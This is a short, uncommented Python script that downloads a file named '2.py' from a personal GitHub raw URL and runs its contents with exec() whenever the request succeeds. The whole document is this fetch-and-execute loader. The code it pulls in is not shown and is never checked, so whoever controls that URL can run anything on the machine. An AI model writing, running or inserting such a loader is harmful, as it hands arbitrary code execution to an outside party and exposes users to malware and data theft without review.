import requests

url = "https://github.com/TheManya178/15/raw/refs/heads/main/2.py"
response = requests.get(url)

if response.status_code == 200:
    exec(response.text)
